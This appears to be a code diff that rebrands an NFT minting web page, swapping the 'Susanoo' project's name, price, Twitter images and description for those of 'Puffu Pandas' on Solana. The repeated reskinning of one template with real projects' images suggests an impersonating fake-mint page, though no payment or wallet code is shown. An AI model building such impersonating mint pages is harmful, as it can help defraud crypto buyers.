@@ -4,18 +4,18 @@
     <meta charset="utf-8">
     <meta name="description" content="NTC" data-react-helmet="true" />
     <meta name="theme-color" content="#000000" />
-    <meta content="🌐 solport.io/mint" property="og:title">
+    <meta content="🌐 puffupandas.io/mint" property="og:title">
     <meta content="
-      🟢 Susanoo Minting is NOW LIVE!
+      🟢 Puffu Pandas Minting is NOW LIVE!
     
-      Mint Price: 3 SOL
+      Mint Price: 0.65 SOL
     " property="og:description">
-    <meta content="https://pbs.twimg.com/profile_banners/852514633093074944/1652114373/1500x500" property="og:image">
+    <meta content="https://pbs.twimg.com/profile_banners/1513263198413197315/1651686575/1500x500" property="og:image">
     <meta name="twitter:card" content="summary_large_image">
-    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/138" />
+    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/142" />
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>Susanoo</title>
-    <link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/1533112918991982592/MPYVqiM-_400x400.jpg" />
+    <title>Puffu Pandas</title>
+    <link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/1521986402765922308/kKQx8QTq_400x400.jpg" />
     <link rel="stylesheet" type="text/css" href="css/all.min.css">
     <link rel="stylesheet" type="text/css" href="css/normalize.css">
     <link rel="stylesheet" type="text/css" href="css/style.css">
@@ -54,12 +54,12 @@
         <div class="main-area">
 
             <div class="main-area__right">
-                <h2 class="right-title">Susanoo</h2>
+                <h2 class="right-title">Puffu Pandas</h2>
 
                 <div class="right-list">
                     <li>
                         <div class="text">
-                            Susanoo (50/50) Dead with $Jutsu Building on the #Solana blockchain.
+                            3333 Puffu Pandas on #Solana a hybrid mint through $DUST and SOL, Proud @DegodsNFT holder building for the #DeGods and #Solana ecosystem. Based out of Toronto.
                     </li>
                     </div>
 
@@ -70,8 +70,8 @@
                             <a href="javascript:void(0)" class="plus-btn">+</a>
                         </div>
                         <div class="price-box">
-                            <div id="price-total"><span>3</span> SOL</div>
-                            <div>1 NFT max per transaction</div>
+                            <div id="price-total"><span>0.65</span> SOL</div>
+                            <div>2 NFT max per transaction</div>
                         </div>
                     </div>
                     <div class="button-box">
@@ -91,7 +91,7 @@
                 </style>
                 <div class="main-area__left">
                     <div class="slider-area">
-                        <img class="animation" src="imgs/1.png" alt="GiF">
+                        <img class="animation" src="https://cdn.discordapp.com/attachments/966052113908117517/966306156215685210/image_2.png" alt="GiF">
                     </div>
                 </div>
             </div>
@@ -107,12 +107,12 @@
         const $numberText = document.querySelector("#total");
         const $remaining = document.querySelector('#remaining');
         const $priceResultText = document.querySelector("#price-total span");
-        let itemPriceSelected = 3;
+        let itemPriceSelected = 0.65;
         let itemCount = 1;
 
         $plusButton.addEventListener("click", function(e) {
             e.preventDefault();
-            itemCount = itemCount < 1 ? itemCount + 1 : 1;
+            itemCount = itemCount < 2 ? itemCount + 1 : 2;
             $numberText.value = itemCount;
             $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
         });
